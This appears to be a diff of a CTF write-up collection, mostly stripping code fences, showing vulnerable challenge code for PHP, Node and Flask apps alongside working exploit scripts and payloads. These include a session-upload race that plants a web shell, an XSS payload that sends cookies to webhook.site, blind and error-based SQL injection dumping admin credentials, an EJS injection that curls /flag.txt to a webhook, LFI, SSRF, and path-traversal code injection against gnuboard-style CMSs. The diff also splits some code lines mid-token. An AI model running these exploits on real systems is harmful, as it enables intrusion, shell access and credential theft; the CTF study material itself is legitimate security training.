@@ -32,11 +32,6 @@
 25
 26
 27
-```
-
-
-
-```
 <?php
 session_start();
 echo "<h2>Do you need phpinfo? ... or not?</h2>";
@@ -63,23 +58,8 @@ if(is_numeric($num)){
 }
 
 ?>
-```
-
-
-
-```
 1
-```
-
-
-
-```
 preg_match("/^[0-9+-\/\*e ]/i", $num)
-```
-
-
-
-```
 1
 2
 3
@@ -99,11 +79,6 @@ preg_match("/^[0-9+-\/\*e ]/i", $num)
 17
 18
 19
-```
-
-
-
-```
 %091
 %0A1
 %0B1
@@ -123,23 +98,8 @@ preg_match("/^[0-9+-\/\*e ]/i", $num)
 %371
 %381
 %391
-```
-
-
-
-```
 1
-```
-
-
-
-```
 preg_match("/flag|\.|php|conf|\*|'|\"/i", $page)
-```
-
-
-
-```
 1
 2
 3
@@ -159,12 +119,7 @@ preg_match("/flag|\.|php|conf|\*|'|\"/i", $page)
 17
 18
 19
-```
-
-
-
-```
-import requests, sys, random, string, io 
+import requests, sys, random, string, io
 
 host = sys.argv[1]
 sess_save_path = '/tmp/83031eb8-41ac-11ee-b1b3-009337b0183d'
@@ -183,11 +138,6 @@ params = {
 response = requests.get(host, cookies=cookies, params=params)
 
 print(response.text)
-```
-
-
-
-```
 1
 2
 3
@@ -223,11 +173,6 @@ print(response.text)
 33
 34
 35
-```
-
-
-
-```
 import io
 import sys
 import requests
@@ -244,7 +189,8 @@ def POST(session):
  TARGET,
  data={"PHP_SESSION_UPLOAD_PROGRESS":"<?php phpinfo();fputs(fopen('/var/www/html/shell.php','w'),'<?php system($_GET[0]); ?>');?>"},
  files={"file":('q.txt', f)},
- cookies={'PHPSESSID':sessid}
+ cookies={'PHPSESSID':
+sessid}
  )
 
 def READ(session):
@@ -263,11 +209,6 @@ with requests.session() as session:
  t1.start()
 
  READ(session)
-```
-
-
-
-```
 1
 2
 3
@@ -277,11 +218,6 @@ with requests.session() as session:
 7
 8
 9
-```
-
-
-
-```
 FROM php:7.4.33-apache
 COPY index.php /var/www/html/
 RUN echo "flag{fake}" > /flag
@@ -291,53 +227,19 @@ RUN sed -i 's/;session.upload_progress.cleanup = On/session.upload_progress.clea
 USER www-data
 RUN mkdir /tmp/83031eb8-41ac-11ee-b1b3-009337b0183d
 EXPOSE 80
-```
-
-
-
-```
 1
 2
-```
-
-
-
-```
 key = key.strip().lower()
 key = key.replace('script','--').replace('onerror','--').replace('frame','--')
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 filename = request.form.get('filename')
 if filename:
  return send_from_directory('captures', filename)
-```
-
-
-
-```
 1
-```
-
-
-
-```
-http://127.0.0.1:22225/api/test?key=<svg on onload="a=document.cookie;fetch(`http://webhook.site/a7ab6dad-6104-4e6b-a8c1-444a208a9d01/?c=`%2Ba)"></svg>
-```
-
-
-
-```
+http://127.0.0.1:
+22225/api/test?key=<svg on onload="a=document.cookie;fetch(`http://webhook.site/a7ab6dad-6104-4e6b-a8c1-444a208a9d01/?c=`%2Ba)"></svg>
 1
 2
 3
@@ -354,18 +256,13 @@ http://127.0.0.1:22225/api/test?key=<svg on onload="a=document.cookie;fetch(`htt
 14
 15
 16
-```
-
-
-
-```
 block_schemes = ["file", "gopher", "blob", "ftp", "glob", "data"]
 block_host = ["localhost"]
 input_scheme = urlparse(link_submitted).scheme
 input_hostname = urlparse(link_submitted).hostname
 
-if '://' not in link_submitted or 
- input_scheme in block_schemes or 
+if '://' not in link_submitted or
+ input_scheme in block_schemes or
  input_hostname in block_host:
  return render_template('submit.html', message = "Link is not correct.", config = config)
 
@@ -374,11 +271,6 @@ if request.form.get('archive') == 'Y':
  message = message + "\nUID : " + uid
  t1 = threading.Thread(target = visit_with_screencapture, args = (link_submitted,request.form['secret'],uid,))
  t1.start()
-```
-
-
-
-```
 1
 2
 3
@@ -390,11 +282,6 @@ if request.form.get('archive') == 'Y':
 9
 10
 11
-```
-
-
-
-```
 def visit_with_screencapture(link_submitted, secret, uid):
  url = link_submitted.strip()
  if secret == config['secret']:
@@ -406,23 +293,8 @@ def visit_with_screencapture(link_submitted, secret, uid):
  filename = "captures/"+uid+".png"
  browser.get_screenshot_as_file(filename)
  browser.quit()
-```
-
-
-
-```
 1
-```
-
-
-
-```
 link= file:///flag&archive=Y&secret=redacted
-```
-
-
-
-```
 1
 2
 3
@@ -434,11 +306,6 @@ link= file:///flag&archive=Y&secret=redacted
 9
 10
 11
-```
-
-
-
-```
 router.post('/check_duplicate', function (request, response) {
  try{
  const id1 = request.body.username;
@@ -450,11 +317,6 @@ router.post('/check_duplicate', function (request, response) {
  const id = decodeURIComponent(id2);
  const query = `SELECT * FROM user WHERE redacted1 = '${id}'`;
  db.query(query, function (error, results, fields) {
-```
-
-
-
-```
 1
 2
 3
@@ -497,11 +359,6 @@ router.post('/check_duplicate', function (request, response) {
 40
 41
 42
-```
-
-
-
-```
 import requests, sys
 import urllib3,urllib
 import string
@@ -511,11 +368,12 @@ def encode_all(string):
  a = "".join("%{0:0>2x}".format(ord(char)) for char in string)
  return a.replace("%20","/**/")
 
-def sqli(q_left,chars): 
+def sqli(q_left,chars):
  # Register an account first with random userid
  data = """654321' and (%s)='%s""" % (q_left, chars)
  data = encode_all(data)
- data2 = {"username":data}
+ data2 = {"username":
+data}
  r = requests.post(TARGET,data=data2)
  return "searchid" in r.text
 
@@ -525,7 +383,7 @@ def exploit(TARGET,SQL_TEMPLATE):
  dumped2 = ""
  while True:
  for chars in string.printable:
- if sqli(SQL_TEMPLATE%i,chars): 
+ if sqli(SQL_TEMPLATE%i,chars):
  dumped += chars
  i+=1
  break
@@ -544,45 +402,21 @@ if __name__ == "__main__":
  # Enumerate username and password of admin
  SQL_TEMPLATE = "select substr((select group_concat(userid,':',passwd) from user where is_admin=1),%s,1)"
  print(exploit(TARGET,SQL_TEMPLATE))
-```
-
-
-
-```
 1
 2
-```
-
-
-
-```
 └─$ grep -Hnri "\.render" | grep -i req
-main.js:152: res.render('admin_board_detail', { ...req.query, post: result[0], isAdmin });
-```
-
-
-
-```
+main.js:
+152: res.render('admin_board_detail', { ...req.query, post: result[0], isAdmin });
 1
 2
 3
 4
 5
-```
-
-
-
-```
 # Exfiltrate /flag.txt
 /main/admin_notice/detail?no=1&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl "https://<webhook>/?c="`cat /flag.txt | base64 -w0`')
 
 # Output the flag on the page (error)
 main/admin_notice/detail?no=1&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('`cat /flag.txt`')
-```
-
-
-
-```
 1
 2
 3
@@ -601,11 +435,6 @@ main/admin_notice/detail?no=1&settings[view options][outputFunctionName]=x;proce
 16
 17
 18
-```
-
-
-
-```
 // Check if the $_SERVER['REQUEST_URI'] includes login2, SERVER, %
 if(preg_match('/login2|SERVER|\%/i',$_SERVER['REQUEST_URI'])) die('[!] No hacking');
 
@@ -624,11 +453,6 @@ if($login == 1 && $_GET['login2'] == 2){
  disallow($include);
  include $include;
 }
-```
-
-
-
-```
 1
 2
 3
@@ -647,11 +471,6 @@ if($login == 1 && $_GET['login2'] == 2){
 16
 17
 18
-```
-
-
-
-```
 <?php
 // Check if the $_SERVER['REQUEST_URI'] includes login2, SERVER, %
 if(preg_match('/login2|SERVER|\%/i',$_SERVER['REQUEST_URI'])) die('[!] No hacking');
@@ -670,49 +489,14 @@ if($login == 1 && $_GET['login2'] == 2){
  include $include;
 }
 ?>
-```
-
-
-
-```
 1
-```
-
-
-
-```
 FROM php:8.2.10-apache
-```
-
-
-
-```
 1
-```
-
-
-
-```
 FROM php:7.4.33-apache
-```
-
-
-
-```
 1
 2
-```
-
-
-
-```
 └─$ curl -s "localhost/?login=1&_GET=2&include=PHP://filter/convert.base64-encode/resource=flag.php" | base64 -d
 flag{fake}
-```
-
-
-
-```
 1
 2
 3
@@ -759,11 +543,6 @@ flag{fake}
 44
 45
 46
-```
-
-
-
-```
 <?php
  function disallow($input) {
  // Check if the input starts with "php://"
@@ -776,7 +555,7 @@ flag{fake}
  error_reporting(0);
  $time = 600;
  $now = time();
- 
+
  if (isset($_SESSION['last_activity']) && ($now - $_SESSION['last_activity']) > $time) {
  session_unset(); session_destroy();
  }
@@ -790,7 +569,7 @@ flag{fake}
  extract($_GET);
  $secretid = "admin";
  $secretpw = rand(10000,99999);
- 
+
  if (!isset($_SESSION['guestpw'])) {
  $_SESSION['guestpw'] = rand(1000, 9999);
  }
@@ -803,92 +582,47 @@ flag{fake}
  include $include;
  }
  else if ($_POST['id'] === 'guest' && $_POST['pw'] === strval($guestpw)) {
- echo "<div class='message'>Login Success<hr></div>";
+ echo "Login Success<hr>";
  result_();
  }
  else {
- echo "<div class='message'>Login Fail<hr></div>";
+ echo "Login Fail<hr>";
  }
 ?>
-```
-
-
-
-```
 1
 2
 3
 4
 5
-```
-
-
-
-```
 FROM php:7.4.33-apache
 COPY index.php /var/www/html/
 RUN echo "flag{fake}" > /var/www/html/flag.php
 RUN cp /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini
 EXPOSE 80
-```
-
-
-
-```
 1
 2
 3
 4
 5
 6
-```
-
-
-
-```
 php > echo var_dump("1" == 1);
 bool(true)
 php > echo var_dump("1a" == 1);
 bool(true)
 php > echo var_dump("1abasasdasdasd" == 1);
 bool(true)
-```
-
-
-
-```
 1
 2
 3
 4
 5
-```
-
-
-
-```
 sudo docker exec -it <docker_id> mariadb --user root -pgnuboard
 
 SET global general_log = on;
 SET global general_log_file='/var/log/mysql/mysql.log';
 SET global log_output = 'file';
-```
-
-
-
-```
 1
-```
-
-
-
-```
 $type = isset($_REQUEST['type']) ? preg_replace("/[\<\>\'\"\\\'\\\"\%\=\(\)\s]/", "", $_REQUEST['type']) : '';
-```
-
-
-
-```
 1
 2
 3
@@ -902,11 +636,6 @@ $type = isset($_REQUEST['type']) ? preg_replace("/[\<\>\'\"\\\'\\\"\%\=\(\)\s]/"
 11
 12
 13
-```
-
-
-
-```
 import requests, sys
 import urllib.parse
 
@@ -920,43 +649,19 @@ payload = urllib.parse.quote(payload)
 r = requests.get(sys.argv[1]+"/shop/listtype.php?type="+payload)
 if "ACS" in r.text:
  print(r.text)
-```
-
-
-
-```
 1
 2
-```
-
-
-
-```
-└─$ python3 exploit.py http://192.168.48.130:20002 | grep -i 'ACS{'
+└─$ python3 exploit.py http://192.168.48.130:
+20002 | grep -i 'ACS{'
 ACS{fake_flag}
-```
-
-
-
-```
 1
 2
 3
 4
-```
-
-
-
-```
 [Complementary measures based on recommendations from the Korea Internet & Security Agency]
 - A security issue was discovered in the set_password() method and patched
 - Security issues were found in record_dataupload() and record_datadrop() methods and patched
 - An issue vulnerable to injection attacks was discovered when downloading attachments from the bulletin board, so this was patched
-```
-
-
-
-```
 1
 2
 3
@@ -983,11 +688,6 @@ ACS{fake_flag}
 24
 25
 26
-```
-
-
-
-```
 import requests,sys
 import urllib3,urllib
 import string
@@ -997,12 +697,14 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 def auth_bypass(TARGET):
 	data = """x'))))) or 1=1#"""
 	headers = {
- "Referer":TARGET
+ "Referer":
+TARGET
 	}
 	data2 = {
  "redirect":"%2F",
  "id":"admin",
- "pwd":data
+ "pwd":
+data
  }
 	r = session.post(TARGET+"/sign/signin-submit?rewritetype=submit",data=data2,headers=headers)
 	return "alert->location" in r.text
@@ -1014,27 +716,13 @@ if __name__ == "__main__":
  if auth_bypass(TARGET):
  print(session.cookies)
  print("Bypass authentication")
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
-└─$ python3 bypass_authentication.py http://192.168.48.130:22030
+└─$ python3 bypass_authentication.py http://192.168.48.130:
+22030
 <RequestsCookieJar[<Cookie PHPSESSID=p9n41hva9q7b4v4n48hv4r2pph for 192.168.48.130/>]>
 Bypass authentication
-```
-
-
-
-```
 1
 2
 3
@@ -1043,11 +731,6 @@ Bypass authentication
 6
 7
 8
-```
-
-
-
-```
 # (1) updatexml()
 /mod/board/controller/result/result?board_id=123123' and updatexml(null,concat(0x0a,(select flag from flag)),null)-- -
 
@@ -1056,47 +739,12 @@ mod/board/controller/result/result?board_id=123123' and extractvalue(rand(),conc
 
 # (3) Basic
 mod/board/controller/result/result?board_id=123123' or (select 1 and row(1,1)>(select count(*),concat(CONCAT((select flag from flag)),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))-- -
-```
-
-
-
-```
 1
-```
-
-
-
-```
 When uploading an image file to a bulletin board developed with XpressEngine, a vulnerability in which an arbitrary file can be uploaded due to insufficient verification of the file. A remote attacker can use this vulnerability to execute arbitrary code on the server where the bulletin board is running.
-```
-
-
-
-```
 1
-```
-
-
-
-```
 /storage/app/public/media/public/media_library/19/61/20231126201643cee1cac995540c33e06d792e077297bd31e7e504.jpg
-```
-
-
-
-```
 1
-```
-
-
-
-```
 <?php system('cat /flag'); ?>
-```
-
-
-
-```
 1
 2
 3
@@ -1115,11 +763,6 @@ When uploading an image file to a bulletin board developed with XpressEngine, a 
 16
 17
 18
-```
-
-
-
-```
 <?php
 $preview = false;
 include_once 'global.php';
@@ -1138,11 +781,6 @@ include_once 'theme.header.php';
 include_once "./themes/".($preview?$theme['fname']:$user["theme"]);
 include_once 'theme.footer.php';
 ?>
-```
-
-
-
-```
 1
 2
 3
@@ -1168,11 +806,6 @@ include_once 'theme.footer.php';
 23
 24
 25
-```
-
-
-
-```
 <?php
 // Will replace /flag to f-l-a-g
 // This function trying to stop us to read /flag
@@ -1181,7 +814,7 @@ function badwordfiltering($string){
 	return $string;
 }
 
-// base64_decode(substr(base64_decode("<BASE64>"),1));
+// base64_decode(substr(base64_decode(""),1));
 // Can add space infront of the first base64 for the substr(,1) function
 function decrypt($string){
 	$r = substr(base64_decode($string), 1);
@@ -1198,39 +831,14 @@ if(isset($_COOKIE['preview_theme'])){
  }
 }
 ?>
-```
-
-
-
-```
 1
-```
-
-
-
-```
 $sql = "UPDATE users SET theme = '$theme' WHERE id = " . $_SESSION['user_id'];
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 $a = htmlspecialchars(base64_decode(substr(base64_decode("IEp5QnZjaUF4UFRFZ0l3PT0="),1)));
 $b = preg_replace("/flag/i", "f-l-a-g", $a);
 echo $b;
-```
-
-
-
-```
 1
 2
 3
@@ -1253,11 +861,6 @@ echo $b;
 20
 21
 22
-```
-
-
-
-```
 import requests, sys
 from base64 import b64encode
 
@@ -1279,11 +882,6 @@ cookies = {
 }
 res = s.get(url + '/index.php', cookies=cookies)
 print(res.text)
-```
-
-
-
-```
 1
 2
 3
@@ -1311,11 +909,6 @@ print(res.text)
 25
 26
 27
-```
-
-
-
-```
 public function set_user_theme($arr) {
  // Get $_COOKIE['unique_theme_id']
  if (get_cookie('unique_theme_id')) {
@@ -1341,13 +934,9 @@ public function set_user_theme($arr) {
  $_config = $arr;
 
  // Save the file in $file location with .php
- parent::save_file('user_config', $file, $_config);
+ parent::
+save_file('user_config', $file, $_config);
 }
-```
-
-
-
-```
 1
 2
 3
@@ -1383,11 +972,6 @@ public function set_user_theme($arr) {
 33
 34
 35
-```
-
-
-
-```
 public function save_file($outvar, $filename, $info=array(), $int=false) {
  $fp = @fopen($filename, 'w');
  $contents = "<?php\n";
@@ -1423,11 +1007,6 @@ public function save_file($outvar, $filename, $info=array(), $int=false) {
  @fclose($fp);
  @chmod($filename, 0644);
 }
-```
-
-
-
-```
 1
 2
 3
@@ -1436,11 +1015,6 @@ public function save_file($outvar, $filename, $info=array(), $int=false) {
 6
 7
 8
-```
-
-
-
-```
 function get_cookie($cookie_name)
 {
  $cookie = md5($cookie_name);
@@ -1449,11 +1023,6 @@ function get_cookie($cookie_name)
  else
  return "";
 }
-```
-
-
-
-```
 1
 2
 3
@@ -1461,11 +1030,6 @@ function get_cookie($cookie_name)
 5
 6
 7
-```
-
-
-
-```
 if (isset($_GET['theme']) || isset($_GET['shop_theme'])) {
  $_user['theme'] = clean_xss_tags(trim($_GET['theme']));
  $_user['shop_theme'] = clean_xss_tags(trim($_GET['shop_theme']));
@@ -1473,31 +1037,18 @@ if (isset($_GET['theme']) || isset($_GET['shop_theme'])) {
 } else {
  $_config = $this->get_user_theme();
 }
-```
-
-
-
-```
 1
 2
 3
 4
 5
-```
-
-
-
-```
 # use ?theme
-curl "http://192.168.48.130:20007/?theme=test" -b "23ec334208a8862afdb7baa48ed00486=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdG1wL3BvYw=="
+curl "http://192.168.48.130:
+20007/?theme=test" -b "23ec334208a8862afdb7baa48ed00486=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdG1wL3BvYw=="
 
 # use ?shop_theme
-curl "http://192.168.48.130:20007/?shop_theme=test" -b "23ec334208a8862afdb7baa48ed00486=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdG1wL3BvYw=="
-```
-
-
-
-```
+curl "http://192.168.48.130:
+20007/?shop_theme=test" -b "23ec334208a8862afdb7baa48ed00486=Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdG1wL3BvYw=="
 1
 2
 3
@@ -1544,11 +1095,6 @@ curl "http://192.168.48.130:20007/?shop_theme=test" -b "23ec334208a8862afdb7baa4
 44
 45
 46
-```
-
-
-
-```
 <?php
  // Load common.php
  $g5_path = '../../..';
@@ -1595,31 +1141,16 @@ curl "http://192.168.48.130:20007/?shop_theme=test" -b "23ec334208a8862afdb7baa4
  $qfile->save_file('push',$push_file,$push);
  }
  }
-```
-
-
-
-```
 1
 2
 3
 4
 5
-```
-
-
-
-```
 # Base64 Encode
 Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdmFyL3d3dy9odG1sL2RhdGEvbWVtYmVyL3B1c2gvcHVzaC5wb2M=
 
 # Base64 Decode
 ../../../../../../../../var/www/html/data/member/push/push.poc
-```
-
-
-
-```
 1
 2
 3
@@ -1628,11 +1159,6 @@ Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vdmFyL3d3dy9odG1sL2RhdGEvbWVtYmVyL3B1c2gvcHVzaC5w
 6
 7
 8
-```
-
-
-
-```
 # Current path (html/eyoom/core/member/push_info.php)
 $g5_path = '../../../';
 include_once($g5_path.'/common.php');
@@ -1641,23 +1167,8 @@ include_once($g5_path.'/common.php');
 @extract($_GET);
 @extract($_POST);
 @extract($_SERVER);
-```
-
-
-
-```
 1
-```
-
-
-
-```
 mb_id=poc&push[memo][alarm]=0&push[".phpinfo()."]=test
-```
-
-
-
-```
 1
 2
 3
@@ -1692,11 +1203,6 @@ mb_id=poc&push[memo][alarm]=0&push[".phpinfo()."]=test
 32
 33
 34
-```
-
-
-
-```
 import requests, sys
 import hashlib
 import base64
@@ -1706,7 +1212,8 @@ TARGET = sys.argv[1]
 
 # Login
 data = {"url":"%2f","mb_id":"test1234","mb_password":"test123@!!!"}
-r = s.post(TARGET+"/bbs/login_check.php",data=data, allow_redirects=False, proxies={"http":"127.0.0.1:8080"})
+r = s.post(TARGET+"/bbs/login_check.php",data=data, allow_redirects=False, proxies={"http":"127.0.0.1:
+8080"})
 if r.status_code == 302:
  print("[+] Login Successfull")
 else:
@@ -1717,12 +1224,14 @@ filename = b"shell"
 cookies = {
  hashlib.md5(b"unique_theme_id").hexdigest(): base64.b64encode(b"../../../../../../../var/www/html/data/member/push/push."+filename).decode()
 }
-r = s.get(TARGET+"/?theme=poc",cookies=cookies, proxies={"http":"127.0.0.1:8080"})
+r = s.get(TARGET+"/?theme=poc",cookies=cookies, proxies={"http":"127.0.0.1:
+8080"})
 print("[+] "+filename.decode()+".php created")
 
 # Inject php code to read file
 data = {
- "mb_id":filename,
+ "mb_id":
+filename,
  "push[memo][alarm]":0,
  "push[\".system(\"cat /flag\").\"]":"nothing"
 }
